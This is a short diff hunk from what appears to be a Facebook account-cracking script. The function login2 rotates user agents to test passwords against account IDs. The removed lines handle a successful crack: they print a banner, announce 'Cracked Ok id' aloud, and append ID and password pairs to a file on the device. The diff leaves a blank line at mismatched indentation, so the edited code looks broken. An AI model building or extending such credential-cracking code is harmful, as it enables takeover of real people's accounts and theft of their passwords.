@@ -529,10 +529,7 @@ def login2(uid):
         ua = random.choice(ugen)
         ua = windows()
         
-            elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mAR Rahim\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mтЧП \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/AR Rahim-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
-                oks.append(uid)
+
                 break
             else:continue
         loop+=1
